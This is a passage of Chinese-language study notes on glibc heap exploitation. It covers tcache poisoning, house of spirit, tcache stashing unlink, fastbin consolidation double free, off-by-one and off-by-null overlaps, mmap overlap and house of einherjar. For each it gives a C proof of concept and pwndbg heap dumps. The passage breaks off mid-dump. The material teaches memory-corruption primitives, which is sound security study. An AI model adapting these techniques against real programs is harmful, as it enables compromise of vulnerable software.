0x431Allocated chunkAddr: 0x405680Size: 0x430Top chunk | PREV_INUSEAddr: 0x405ab0Size: 0x20551pwndbg&gt; x&#x2F;20gx 0x4052500x405250:0x00000000000000000x00000000000004310x405260:0x00000000000000000x00000000000000000x405270:0x00000000004040500x00000000004040580x405280:0x00000000000000000x00000000000000000x405290:0x00000000000000000x00000000000000000x4052a0:0x00000000000000000x00000000000000000x4052b0:0x00000000000000000x00000000000000000x4052c0:0x00000000000000000x00000000000000000x4052d0:0x00000000000000000x00000000000000000x4052e0:0x00000000000000000x0000000000000000pwndbg&gt; x&#x2F;20gx 0x4056800x405680:0x00000000000004200x00000000000004300x405690:0x00000000000000000x00000000000000000x4056a0:0x00000000000000000x00000000000000000x4056b0:0x00000000000000000x00000000000000000x4056c0:0x00000000000000000x00000000000000000x4056d0:0x00000000000000000x00000000000000000x4056e0:0x00000000000000000x00000000000000000x4056f0:0x00000000000000000x00000000000000000x405700:0x00000000000000000x00000000000000000x405710:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放第二个堆即可通过第一个堆去改任意地址的内容</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x431Allocated chunkAddr: 0x405680Size: 0x430Allocated chunk | PREV_INUSEAddr: 0x405ab0Size: 0x20551pwndbg&gt; x&#x2F;20gx 0x4052500x405250:0x00000000000000000x00000000000004310x405260:0x00000000000000000x0000000000020da10x405270:0x00000000004040500x00000000004040580x405280:0x00000000000000000x00000000000000000x405290:0x00000000000000000x00000000000000000x4052a0:0x00000000000000000x00000000000000000x4052b0:0x00000000000000000x00000000000000000x4052c0:0x00000000000000000x00000000000000000x4052d0:0x00000000000000000x00000000000000000x4052e0:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdin, NULL);setbuf(stdout, NULL);size_t stack_var;intptr_t *a &#x3D; malloc(128);intptr_t *b &#x3D; malloc(128);    free(a);free(b);b[0] &#x3D; (intptr_t)&amp;stack_var;intptr_t *c &#x3D; malloc(128);assert((long)&amp;stack_var &#x3D;&#x3D; (long)c);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打<code>fd</code>实现任意地址读写</p><p>创建两个堆再释放掉，进入<code>tcache</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x405250Size: 0x91fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x4052e0Size: 0x91fd: 0x405260Top chunk | PREV_INUSEAddr: 0x405370Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改第二个堆的<code>fd</code>为目标地址之后再申请即可实现任意地址读写</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x91Free chunk (tcache) | PREV_INUSEAddr: 0x4052e0Size: 0x91fd: 0x7fffffffdd70Top chunk | PREV_INUSEAddr: 0x405370Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdout, NULL);malloc(1);unsigned long long *a; unsigned long long fake_chunks[10];     fake_chunks[1] &#x3D; 0x40; a &#x3D; &amp;fake_chunks[2];free(a);void *b &#x3D; malloc(0x30);assert((long)b &#x3D;&#x3D; (long)&amp;fake_chunks[2]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在栈上伪造一个堆之后释放掉再申请即可申请到伪造的堆，<code>tcache</code>会判断取出堆之后的下标不能为负数，所以要先创建一个堆</p><p>先随便创建一个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x21Top chunk | PREV_INUSEAddr: 0x405270Size: 0x20d91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再在栈上伪造一个堆，主要是伪造<code>size</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd200x7fffffffdd20:0x000000000000000f0x00000000000000400x7fffffffdd30:0x00007fffffffdd980x00000000000000f00x7fffffffdd40:0x00000000000000c20x00000000004013ad0x7fffffffdd50:0x00007ffff7de59a00x00000000000000000x7fffffffdd60:0x00000000004013600x00000000004010f00x7fffffffdd70:0x00007fffffffde600x00007fffffffdd300x7fffffffdd80:0x00000000004013600x00007ffff7a05b970x7fffffffdd90:0x00000000000000010x00007fffffffde680x7fffffffdda0:0x000000010000c0000x00000000004011d60x7fffffffddb0:0x00000000000000000x762a1758ffbc0fb4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放之后再申请即可申请到这个位置实现任意地址读写</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x40 [  1]: 0x7fffffffdd30 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;    unsigned long stack_var[0x10] &#x3D; &#123;0&#125;;    unsigned long *chunk_lis[0x10] &#x3D; &#123;0&#125;;    unsigned long *target;    setbuf(stdout, NULL);    stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);    for(int i &#x3D; 0;i &lt; 9;i++)&#123;        chunk_lis[i] &#x3D; (unsigned long*)malloc(0x90);    &#125;    for(int i &#x3D; 3;i &lt; 9;i++)&#123;        free(chunk_lis[i]);    &#125;    free(chunk_lis[1]);    free(chunk_lis[0]);    free(chunk_lis[2]);        malloc(0xa0);    malloc(0x90);    malloc(0x90);    chunk_lis[2][1] &#x3D; (unsigned long)stack_var;    calloc(1,0x90);    target &#x3D; malloc(0x90);       assert(target &#x3D;&#x3D; &amp;stack_var[2]);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该方法是<code>2.27</code>或<code>2.29</code>下用<code>calloc</code>创建堆时候针对<code>small bin</code>的攻击</p><p>创建<code>9</code>个大小属于<code>unsorted bin</code>的堆并全部释放</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405390smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个比释放的堆大的堆使得释放的堆进入<code>small bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着从<code>tcache</code>取了两个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>small bin</code>的最后一个堆<code>fd</code>改成栈上的地址，即目标地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0 [corrupted]FD: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390BK: 0x405250 —▸ 0x405390 —▸ 0x7fffffffdcd0 —▸ 0x7fffffffdce0 ◂— 0x0largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于<code>calloc</code>不会从<code>tcache</code>中取堆，所以用<code>calloc</code>创建一个堆，<code>tcache</code>中有两个空位，此时<code>small bin</code>中的堆会进入<code>tcache</code>，再次用<code>malloc</code>申请即可得到篡改的栈地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  7]: 0x7fffffffdce0 —▸ 0x4053a0 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0 [corrupted]FD: 0x405390 —▸ 0x4056c0 ◂— 0x0BK: 0x7fffffffdce0 ◂— 0x0largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fastbin-dup-consolidate-double-free"><a href="#fastbin-dup-consolidate-double-free" class="headerlink" title="fastbin_dup_consolidate(double free)"></a>fastbin_dup_consolidate(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;void main() &#123;void *ptr[7];for(int i &#x3D; 0; i &lt; 7; i++)ptr[i] &#x3D; malloc(0x40);for(int i &#x3D; 0; i &lt; 7; i++)free(ptr[i]);void* p1 &#x3D; calloc(1,0x40);  free(p1);  void* p3 &#x3D; malloc(0x400);assert(p1 &#x3D;&#x3D; p3);free(p1);void *p4 &#x3D; malloc(0x400);assert(p4 &#x3D;&#x3D; p3);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用了<code>double free</code>和<code>calloc</code>不会从<code>tcache</code>取堆的原理</p><p>填满<code>tcache</code>再释放一个堆到<code>fast bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x405890 ◂— 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个属于<code>small bin</code>的堆然后再次释放<code>fast bin</code>里的堆，此时<code>fast bin</code>中的堆被和那个大于<code>small bin</code>的堆合并了</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x00x410 [  1]: 0x4058a0 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请出合并的堆即可申请到那个大的堆了且它并没有被释放</p><h3 id="overlapping-chunks-off-by-one"><a href="#overlapping-chunks-off-by-one" class="headerlink" title="overlapping_chunks(off-by-one)"></a>overlapping_chunks(off-by-one)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main(int argc , char* argv[])&#123;setbuf(stdout, NULL);intptr_t *p1,*p2,*p3,*p4;    p1 &#x3D; malloc(0x500 - 8);p2 &#x3D; malloc(0x500 - 8);p3 &#x3D; malloc(0x80 - 8);memset(p1, &#39;1&#39;, 0x500 - 8);memset(p2, &#39;2&#39;, 0x500 - 8);memset(p3, &#39;3&#39;, 0x80 - 8);free(p2);int evil_chunk_size &#x3D; 0x581;int evil_region_size &#x3D; 0x580 - 8;    *(p2-1) &#x3D; evil_chunk_size;     p4 &#x3D; malloc(evil_region_size);memset(p4, &#39;4&#39;, evil_region_size);memset(p3, &#39;3&#39;, 80);assert(strstr((char *)p4, (char *)p3));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请三个堆（前两个堆大于<code>tcache</code>)，利用第一个堆去修改第二个堆的内容，释放第二个堆进入<code>unsorted bin</code>之后改第二个堆的<code>size</code>为第二个堆和第三个堆的大小之和，再去创建这个大小的堆即可利用这个堆去覆写第三个堆而第三个堆仍然存在</p><p>先创建三个堆，并释放第二个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x501Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405750Size: 0x501fd: 0x7ffff7dcfca0bk: 0x7ffff7dcfca0Allocated chunkAddr: 0x405c50Size: 0x80Top chunk | PREV_INUSEAddr: 0x405cd0Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改第二个堆的<code>size</code>位使其覆盖下一个堆，此时已经看到第二个堆包含了第三个堆，再去创建出这个堆即可实现对第三个对的<code>overlap</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x501Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405750Size: 0x581fd: 0x7ffff7dcfca0bk: 0x7ffff7dcfca0Top chunk | PREV_INUSEAddr: 0x405cd0Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="poison-null-byte-off-by-null"><a href="#poison-null-byte-off-by-null" class="headerlink" title="poison_null_byte(off-by-null)"></a>poison_null_byte(off-by-null)</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x9f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xa00</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code>,只要堆大小在<code>tcache</code>之上即可</p><h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;assert.h&gt;int main()&#123;int* ptr1 &#x3D; malloc(0x10); long long* top_ptr &#x3D; malloc(0x100000);long long* mmap_chunk_2 &#x3D; malloc(0x100000);long long* mmap_chunk_3 &#x3D; malloc(0x100000);    mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;    free(mmap_chunk_3); long long* overlapping_chunk &#x3D; malloc(0x300000);    int distance &#x3D; mmap_chunk_2 - overlapping_chunk;overlapping_chunk[distance] &#x3D; 0x1122334455667788;assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code></p><h3 id="house-of-einherjar-off-by-null-1"><a href="#house-of-einherjar-off-by-null-1" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdin, NULL);setbuf(stdout, NULL);uint8_t* a;uint8_t* b;uint8_t* d;a &#x3D; (uint8_t*) malloc(0x38);int real_a_size &#x3D; malloc_usable_size(a);size_t fake_chunk[6];fake_chunk[0] &#x3D; 0x100;fake_chunk[1] &#x3D; 0x100;fake_chunk[2] &#x3D; (size_t) fake_chunk; fake_chunk[3] &#x3D; (size_t) fake_chunk; fake_chunk[4] &#x3D; (size_t) fake_chunk; fake_chunk[5] &#x3D; (size_t) fake_chunk; b &#x3D; (uint8_t*) malloc(0x4f8);int real_b_size &#x3D; malloc_usable_size(b);uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);    a[real_a_size] &#x3D; 0; size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;fake_chunk[1] &#x3D; fake_size;free(b);d &#x3D; malloc(0x200);assert((long)d &#x3D;&#x3D; (long)&amp;fake_chunk[2]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先创建两个堆和一个伪造的堆,第一个堆的大小要是<code>0x?8</code>用来溢出到下一个堆的<code>size</code>位实现<code>off-by-null</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x41Allocated chunk | PREV_INUSEAddr: 0x405290Size: 0x501Top chunk | PREV_INUSEAddr: 0x405790Size: 0x20871<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd100x7fffffffdd10:0x00000000000001000x0000000000000100#prve_size    size0x7fffffffdd20:0x00007fffffffdd100x00007fffffffdd10#fd           bk0x7fffffffdd30:0x00007fffffffdd100x00007fffffffdd10#fd_nextsize  bknextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>改第二个堆的<code>inuse</code>为<code>0</code>,即表示上一个堆已经释放，再伪造<code>fake_chunk</code>的大小和第二个堆的<code>size</code>,绕过<code>prve_size == fd-&gt;size</code>的检查</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x41Allocated chunkAddr: 0x405290Size: 0x500Top chunk | PREV_INUSEAddr: 